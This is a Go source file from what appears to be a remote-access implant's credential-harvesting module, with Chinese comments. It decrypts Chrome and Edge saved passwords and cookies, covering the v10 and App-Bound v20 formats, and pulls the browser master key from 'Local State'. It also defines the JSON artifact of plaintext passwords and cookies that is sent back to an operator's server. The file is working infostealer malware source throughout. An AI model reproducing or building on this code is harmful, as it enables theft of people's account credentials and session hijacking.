package services

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"time"
)

// 浏览器凭据/ Cookie 采集（凭据模块族第二批）。
//
// 采集链路与 LSASS 转储共用同一套制品管线（crd 请求登记 → 下载通道回传 →
// 服务端校验归属），区别在于本模块**在植入体内存里完成解密**：
// Chrome/Edge 的登录口令与 Cookie 都是"DPAPI 保护的主密钥 + AES-GCM 密文"，
// 解出来才是能直接用的明文。明文不落盘：内存解析 → 写一份 JSON 到 %TEMP%
// → 立即回传 → 回传后删除（与服务端"不落盘明文"的约定一致）。
//
// 本文件只放**跨平台可测**的部分（结构、解密算法、路径推断）；
// Windows 专有的驱动逻辑在 browser_windows.go。

// 浏览器密文前缀（Chromium 系）
const (
	prefixV10 = "v10" // AES-256-GCM：12 字节 nonce + 密文 + 16 字节 tag
	prefixV20 = "v20" // App-Bound：32 字节随机前缀参与派生（SHA256(prefix||key)）
)

// CollectedCredential 一条登录口令（明文）
type CollectedCredential struct {
	URL     string `json:"url"`
	User    string `json:"user"`
	Pass    string `json:"pass"`
	Browser string `json:"browser,omitempty"`
	Profile string `json:"profile,omitempty"`
	Created int64  `json:"created,omitempty"`
}

// CollectedCookie 一条 Cookie（明文值）
type CollectedCookie struct {
	Host     string `json:"host"`
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path,omitempty"`
	Expires  int64  `json:"expires,omitempty"`
	Secure   bool   `json:"secure,omitempty"`
	HTTPOnly bool   `json:"httponly,omitempty"`
}

// CollectedProfile 一个浏览器配置（Default / Profile N）
type CollectedProfile struct {
	Name        string                `json:"name"`
	Profile     string                `json:"profile"`
	UserDataDir string                `json:"user_data_dir,omitempty"`
	Tech        string                `json:"tech,omitempty"`
	MasterKey   string                `json:"master_key,omitempty"`
	Credentials []CollectedCredential `json:"credentials"`
	Cookies     []CollectedCookie     `json:"cookies"`
}

// CollectedBrowserArtifact 回传制品（服务端按此 schema 解析入库）
type CollectedBrowserArtifact struct {
	Host        string             `json:"host"`
	User        string             `json:"user"`
	CollectedAt string             `json:"collected_at"`
	Errors      []string           `json:"errors,omitempty"`
	Browsers    []CollectedProfile `json:"browsers"`
}

// 采集上限：避免 Cookie 上万条时把回传通道与凭据库压垮。
// 与 TODO 服务端的 cred.MaxCredentialItems / MaxBrowserCookies 保持一致。
const (
	maxCredentialItems = 2000
	maxCookieItems     = 20000
)

// MarshalArtifact 序列化制品（单独抽出便于测试）。
// 指针接收者：需要把补上的采集时间写回调用方看到的那个值。
func (a *CollectedBrowserArtifact) MarshalArtifact() ([]byte, error) {
	if a.CollectedAt == "" {
		a.CollectedAt = time.Now().Format("2006-01-02 15:04:05")
	}
	return json.Marshal(a)
}

// decryptChromiumBlob 解一条 Chromium 密文。
//
// 三种形态（同一套密钥，前缀决定算法）：
//
//	v10：3 字节前缀 + 12 字节 nonce + 密文 + 16 字节 tag，AES-256-GCM 直接解
//	v20：3 字节前缀 + 32 字节前缀随机数 + 12 字节 nonce + 密文 + tag，
//	     密钥 = SHA256(32 字节前缀 || 浏览器主密钥)（App-Bound Encryption）
//	其他：老版本或未加密，按明文返回
//
// 任一步长度不足都显式报错：截断的密文解出来是垃圾，宁可跳过该条也不要写进凭据库。
func decryptChromiumBlob(key, blob []byte) ([]byte, error) {
	if len(blob) < 3 {
		return blob, nil // 太短，按明文处理（老格式里确实有纯明文条目）
	}
	prefix := string(blob[:3])
	switch prefix {
	case prefixV10:
		body := blob[3:]
		const nonceLen, tagLen = 12, 16
		if len(body) < nonceLen+tagLen {
			return nil, fmt.Errorf("v10 密文长度不足: %d", len(body))
		}
		return aesGCMOpen(key, body[:nonceLen], body[nonceLen:])
	case prefixV20:
		body := blob[3:]
		const prefixLen, nonceLen, tagLen = 32, 12, 16
		if len(body) < prefixLen+nonceLen+tagLen {
			return nil, fmt.Errorf("v20 密文长度不足: %d", len(body))
		}
		derived := sha256.Sum256(append(append([]byte{}, body[:prefixLen]...), key...))
		return aesGCMOpen(derived[:], body[prefixLen:prefixLen+nonceLen], body[prefixLen+nonceLen:])
	default:
		return blob, nil
	}
}

// aesGCMOpen 用 GCM 解一段"密文||tag"
func aesGCMOpen(key, nonce, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("AES 密钥不可用: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("构造 GCM 失败: %w", err)
	}
	if len(ciphertext) < gcm.Overhead() {
		return nil, fmt.Errorf("密文长度不足: %d", len(ciphertext))
	}
	plain, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("GCM 解密失败（密钥不匹配或数据被改）: %w", err)
	}
	return plain, nil
}

// decodeLocalStateKey 从 Chrome/Edge 的 `Local State` 里取浏览器主密钥。
//
// 结构：{"os_crypt":{"encrypted_key":"<base64>"}}，base64 解出来以 "DPAPI" 五字节
// 开头（Windows 平台的标记），去掉后交给 DPAPI 解。
// 返回的是可直接用于 AES-GCM 的 32 字节密钥。
func decodeLocalStateKey(localState []byte) (string, []byte, error) {
	var parsed struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(localState, &parsed); err != nil {
		return "", nil, fmt.Errorf("Local State 不是合法 JSON: %w", err)
	}
	raw := strings.TrimSpace(parsed.OSCrypt.EncryptedKey)
	if raw == "" {
		return "", nil, errors.New("Local State 中没有 os_crypt.encrypted_key")
	}
	blob, err := base64.StdEncoding.DecodeString(raw)
	if err != nil {
		return "", nil, fmt.Errorf("encrypted_key 不是合法 base64: %w", err)
	}
	if len(blob) < 5 || string(blob[:5]) != "DPAPI" {
		return "", nil, errors.New("encrypted_key 不以 DPAPI 标记开头（可能不是 Windows 平台或格式已变）")
	}
	return "dpapi", blob[5:], nil
}

// isProfileDir 判断 User Data 下的一个目录名是否是一个浏览器配置
func isProfileDir(name string) bool {
	if name == "Default" {
		return true
	}
	return strings.HasPrefix(name, "Profile ")
}
